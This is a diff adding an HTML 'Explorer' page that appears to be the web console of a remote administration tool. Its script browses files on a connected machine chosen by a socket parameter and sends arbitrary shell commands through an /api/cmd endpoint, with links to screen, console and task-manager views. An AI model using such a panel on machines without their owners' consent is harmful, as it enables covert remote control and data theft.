@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<title>Explorer</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="https://i.imgur.com/CsVKESW.jpg">
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+	<style type="text/css">
+		@import url("https://fonts.googleapis.com/css?family=Roboto+Mono");
+
+		table {
+			width: 100%;
+			border-collapse: collapse;
+		}
+
+		th,
+		td {
+			border: 1px solid darkorange;
+			padding: 2px;
+			text-align: left;
+		}
+
+		th {
+			background-color: orange;
+			font-weight: bold;
+		}
+
+		tr:nth-child(even) {
+			background-color: #f2f2f2;
+		}
+
+		tr:nth-child(odd) {
+			background-color: #FFF;
+		}
+
+		tr:hover {
+			background-color: lightgray;
+			cursor: pointer;
+		}
+
+		header-table {
+			position: absolute;
+		}
+
+		.headbtn {
+			padding: 10px 20px;
+			background-color: #007bff;
+			color: #fff;
+			text-decoration: none;
+			border-radius: 5px;
+			margin-left: 4px;
+		}
+
+		.headbtn:hover {
+			background-color: green;
+		}
+
+		.headfield {
+			padding: 10px 20px;
+			text-decoration: none;
+			border-radius: 5px;
+			margin-left: 4px;
+			width: 90%;
+		}
+
+		.logo {
+			max-width: 100px;
+		}
+
+		body {
+			font-family: "Roboto", sans-serif;
+			background-color: #f7f7f7;
+			padding: 20px;
+		}
+
+		.title {
+			text-align: center;
+			flex-grow: 1;
+		}
+
+		.header {
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+			padding: 20px;
+		}
+
+		#pathInput::placeholder {
+			color: #999;
+		}
+
+		#context-menu {
+			position: absolute;
+			background-color: #fff;
+			border: 1px solid #ccc;
+			padding: 5px;
+			display: none;
+		}
+
+		#context-menu ul {
+			list-style: none;
+			padding: 0;
+			margin: 0;
+		}
+
+		#context-menu li {
+			cursor: pointer;
+			padding: 2px;
+		}
+
+		#context-menu li:hover {
+			background-color: lightgrey;
+		}
+
+		.hidden {
+			display: none;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="header">
+		<img src="https://i.imgur.com/CsVKESW.jpg" alt="Lgo" class="logo">
+		<h1 class="title">Explorer</h1>
+		<a href="connections?" class="headbtn">Connections</a>
+		<a href="screen?" class="headbtn">Screen</a>
+		<a href="console?" class="headbtn">Console</a>
+		<a href="taskmgr?" class="headbtn">Taskmgr</a>
+		<a href="license?" class="headbtn">License</a>
+	</div>
+	<div>
+		<button id="upbtn" class="headbtn" style="float: left;">Up</button>
+		<input type="text" id="pathInput" class="headfield" style="float: right;" placeholder="Enter path">
+	</div>
+	<br>
+	<br>
+	<br>
+	<table>
+		<div id="table-container">
+			<div>
+	</table>
+	<br>
+	<br>
+	<br>
+	<div>
+		<input type="text" id="commandInput" class="headfield" placeholder="Enter command...">
+		<button id="execbtn" class="headbtn">Do</button>
+	</div>
+</body>
+<script>
+	const socket = window.location.href.split("?socket=")[1];
+	document.getElementById("pathInput").value="/";
+	var contextMenu = document.getElementById("context-menu");
+	updateLinks();
+	setInterval(updateTable, 1000);
+	alert("Reduced functionality. Use graphics mode for the full experience.");
+	document.getElementById("execbtn").addEventListener("click", function () {
+		var cmd = document.getElementById("commandInput").value;
+		let url = "/api/cmd?socket=" + socket + "&command=" + cmd;
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				Swal.fire("Command sent. Answer:" + JSON.stringify(data), "", "success");
+				document.getElementById("commandInput").value = "";
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	});
+	document.getElementById("upbtn").addEventListener("click", function () {
+		document.getElementById("pathInput").value = getParent(document.getElementById("pathInput").value);
+	});
+	document
+		.getElementById("table-container")
+		.addEventListener("click", function (event) {
+			if (event.target.tagName === "TD") {
+				let selectedRow = event.target.parentNode;
+				let rowData = Array.from(selectedRow.children).map(
+					(cell) => cell.textContent
+				);
+				console.log("Selected: ", rowData);
+				document.getElementById("pathInput").value = openPath(document.getElementById("pathInput").value, rowData);
+			}
+		});
+	function openPath(path, file) {
+		if (path.endsWith("/") || path.endsWith("\\")) {
+			path = path + file;
+		} else {
+			path = path + "/" + file;
+		}
+		return path;
+	}
+	function getParent(path) {
+		var parts = path.split("/");
+		if (parts.length === 1) {
+			return null;
+		} else if (parts.length === 2) {
+			return "/";
+		} else {
+			parts.pop();
+			return parts.join("/");
+		}
+	}
+	function executeCMD(cmd) {
+		console.log(cmd);
+		let url = "/api/cmd?socket=" + socket + "&command=" + cmd;
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				Swal.fire("Command sent. Answer:" + JSON.stringify(data), "", "success");
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	}
+	function updateTable() {
+		let path = document.getElementById("pathInput").value;
+		let url = "/api/explorer?socket=" + socket + "&path=" + path.replace(/\//g, "splitter");
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				let jsonArray = data;
+				let tableContainer = document.getElementById("table-container");
+				while (tableContainer.firstChild) {
+					tableContainer.removeChild(tableContainer.firstChild);
+				}
+				let table = document.createElement("table");
+				let headerRow = table.insertRow();
+				let titleSell = document.createElement("th");
+				titleSell.textContent = "File";
+				headerRow.appendChild(titleSell);
+				jsonArray.forEach((item) => {
+					let row = table.insertRow();
+					row.classList.add("data-row");
+					Object.values(item).forEach((value) => {
+						let cell = row.insertCell();
+						cell.textContent = value;
+					});
+				});
+
+				tableContainer.appendChild(table);
+			})
+			.catch(error => {
+				console.error('Error: ', error.toString());
+			});
+	}
+	function updateLinks() {
+		let linkElements = document.querySelectorAll(".headbtn");
+		linkElements.forEach((linkElement) => {
+			let currentHref = linkElement.getAttribute("href");
+			if (currentHref) {
+				let newUrl = currentHref.split("?")[0];
+				linkElement.setAttribute("href", newUrl + "?socket=" + socket);
+			}
+		});
+	}
+</script>
+
+</html>
